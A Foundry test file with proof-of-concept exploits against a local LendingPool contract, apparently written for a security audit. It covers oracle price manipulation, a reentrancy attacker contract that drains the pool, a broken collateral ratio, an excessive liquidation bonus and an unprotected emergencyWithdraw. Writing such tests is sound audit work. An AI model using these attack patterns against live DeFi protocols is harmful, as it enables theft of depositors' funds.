// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/LendingPool.sol";

contract ExploitTest is Test {
    LendingPool public pool;
    address public oracle;
    address public attacker;
    address public victim;

    function setUp() public {
        oracle = makeAddr("oracle");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        pool = new LendingPool(oracle);
        
        // Fund accounts
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(address(pool), 50 ether);
    }

    /// @notice PoC for Bug #1 - Price Manipulation (Critical)
    /// Anyone can call updatePrice() and manipulate the oracle
    function test_Exploit_PriceManipulation() public {
        // Victim deposits 10 ETH as collateral and borrows 5 ETH
        vm.startPrank(victim);
        pool.deposit{value: 10 ether}();
        pool.borrow(5 ether);
        vm.stopPrank();
        
        // Verify position is healthy at current price ($2000)
        assertTrue(pool.healthFactor(victim) >= 120, "Should be healthy initially");
        
        // Attacker manipulates price to $1 (essentially 0)
        vm.prank(attacker);
        pool.updatePrice(1); // Set price to near-zero
        
        // Now victim's health factor is destroyed
        uint256 healthAfter = pool.healthFactor(victim);
        assertLt(healthAfter, 120, "Position should be liquidatable after price manipulation");
        
        // Attacker can now liquidate the victim's position unfairly
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        pool.liquidate{value: 5 ether}(victim);
        
        // Attacker gained victim's collateral (minus the debt they paid)
        uint256 attackerBalanceAfter = attacker.balance;
        // They paid 5 ETH but received 10 ETH + 1 ETH bonus = 11 ETH
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should profit");
        
        console.log("Price Manipulation Exploit Successful!");
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore + 5 ether, "wei");
    }

    /// @notice PoC for Bug #2 - Reentrancy (Critical)
    /// External call before state update allows recursive withdrawals
    function test_Exploit_Reentrancy() public {
        // Deploy attacker contract
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(pool));
        vm.deal(address(attackerContract), 1 ether);
        
        uint256 poolBalanceBefore = address(pool).balance;
        uint256 attackerBalanceBefore = address(attackerContract).balance;
        
        console.log("Pool balance before:", poolBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        
        // Attack!
        attackerContract.attack{value: 1 ether}();
        
        uint256 poolBalanceAfter = address(pool).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;
        
        console.log("Pool balance after:", poolBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);
        
        // Attacker should have stolen funds
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have more funds");
        assertLt(poolBalanceAfter, poolBalanceBefore, "Pool should have lost funds");
        
        console.log("Reentrancy Exploit Successful!");
        console.log("Funds stolen:", attackerBalanceAfter - attackerBalanceBefore - 1 ether);
    }

    /// @notice PoC for Bug #3 - Wrong Collateral Calculation (Medium)
    /// Users can borrow 100% of collateral instead of 66% (150% ratio)
    function test_Exploit_CollateralCalculation() public {
        vm.startPrank(victim);
        
        // Deposit 10 ETH as collateral
        pool.deposit{value: 10 ether}();
        
        // With 150% collateral ratio, max borrow should be: 10 / 1.5 = 6.66 ETH
        // But the bug allows borrowing 100% = 10 ETH!
        
        // This should fail with proper collateral ratio check
        // But it succeeds due to the bug
        pool.borrow(10 ether);
        
        // User borrowed their entire collateral - position is undercollateralized!
        uint256 borrowed = pool.borrows(victim);
        uint256 deposited = pool.collateral(victim);
        
        assertEq(borrowed, 10 ether, "Borrowed full collateral");
        assertEq(deposited, 10 ether, "Collateral equals borrow");
        
        // Health factor should be 100, but 120 is required
        uint256 health = pool.healthFactor(victim);
        assertEq(health, 100, "Health factor is only 100%");
        assertLt(health, 120, "Position is undercollateralized from the start!");
        
        vm.stopPrank();
        
        console.log("Collateral Calculation Exploit Successful!");
        console.log("Borrowed 100% of collateral instead of 66%");
    }

    /// @notice PoC for Bug #4 - Repay Underflow (Medium)
    /// No check for overpayment - excess funds are lost
    function test_Exploit_RepayUnderflow() public {
        vm.startPrank(victim);
        
        // Deposit and borrow
        pool.deposit{value: 10 ether}();
        pool.borrow(5 ether);
        
        uint256 debt = pool.borrows(victim);
        assertEq(debt, 5 ether, "Should have 5 ETH debt");
        
        // Try to repay more than owed
        // In Solidity 0.8+, this will revert due to underflow protection
        vm.expectRevert();
        pool.repay{value: 10 ether}(); // Trying to repay 10 when only owe 5
        
        vm.stopPrank();
        
        // The vulnerability: if someone tries to overpay, they lose funds
        // A proper implementation should refund the excess
        console.log("Repay Underflow Test Complete!");
        console.log("Overpayment correctly reverts, but excess should be refunded instead");
    }

    /// @notice PoC for Bug #5 - Liquidation Bonus Bug (Medium/Critical)
    /// Reward calculation can exceed contract balance
    function test_Exploit_LiquidationBonus() public {
        // Victim deposits 10 ETH and borrows 8 ETH (over-leveraged due to Bug #3)
        vm.startPrank(victim);
        pool.deposit{value: 10 ether}();
        pool.borrow(8 ether);
        vm.stopPrank();
        
        // Manipulate price to make position unhealthy (using Bug #1)
        pool.updatePrice(1500 * 1e18); // Price drops from $2000 to $1500
        
        // Verify position is now unhealthy
        assertLt(pool.healthFactor(victim), 120, "Position should be liquidatable");
        
        // Calculate expected reward
        uint256 victimCollateral = pool.collateral(victim);
        uint256 bonus = (victimCollateral * 10) / 100; // 10% bonus
        uint256 expectedReward = victimCollateral + bonus; // 11 ETH!
        
        console.log("Victim collateral:", victimCollateral);
        console.log("Liquidation bonus:", bonus);
        console.log("Expected reward:", expectedReward);
        console.log("Pool balance:", address(pool).balance);
        
        // The bug: reward (11 ETH) may exceed pool balance
        // Let's reduce pool balance to demonstrate
        
        // First, let's see current pool balance
        uint256 poolBalance = address(pool).balance;
        console.log("Pool balance before liquidation:", poolBalance);
        
        // Attacker liquidates
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        pool.liquidate{value: 8 ether}(victim);
        uint256 attackerBalanceAfter = attacker.balance;
        
        // Attacker paid 8 ETH but received 11 ETH (10 ETH collateral + 1 ETH bonus)
        uint256 profit = attackerBalanceAfter + 8 ether - attackerBalanceBefore;
        console.log("Attacker received:", profit);
        console.log("Attacker profit:", int256(profit) - 8 ether);
        
        // The bonus is 110% of collateral, not 110% of debt!
        // This is economically incorrect
        assertEq(profit, expectedReward, "Reward equals 110% of collateral");
        
        console.log("Liquidation Bonus Exploit Successful!");
    }

    /// @notice BONUS: PoC for emergencyWithdraw - no access control (Critical)
    function test_Exploit_EmergencyWithdraw() public {
        uint256 poolBalanceBefore = address(pool).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("Pool balance before:", poolBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        
        // Anyone can call emergencyWithdraw and drain the pool!
        vm.prank(attacker);
        pool.emergencyWithdraw();
        
        uint256 poolBalanceAfter = address(pool).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("Pool balance after:", poolBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);
        
        // Pool is completely drained
        assertEq(poolBalanceAfter, 0, "Pool should be empty");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + poolBalanceBefore, "Attacker got all funds");
        
        console.log("Emergency Withdraw Exploit Successful!");
        console.log("Attacker stole:", poolBalanceBefore);
    }
}

/// @notice Attacker contract for reentrancy exploit
contract ReentrancyAttacker {
    LendingPool public pool;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _pool) {
        pool = LendingPool(payable(_pool));
        maxAttacks = 5;
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // Deposit our ETH
        pool.deposit{value: msg.value}();
        
        // Start the attack by withdrawing
        attackCount = 0;
        pool.withdraw(msg.value);
    }
    
    receive() external payable {
        // Reentrancy: while we're receiving the withdrawal,
        // our deposit balance hasn't been updated yet!
        if (attackCount < maxAttacks && address(pool).balance >= 1 ether) {
            attackCount++;
            pool.withdraw(1 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
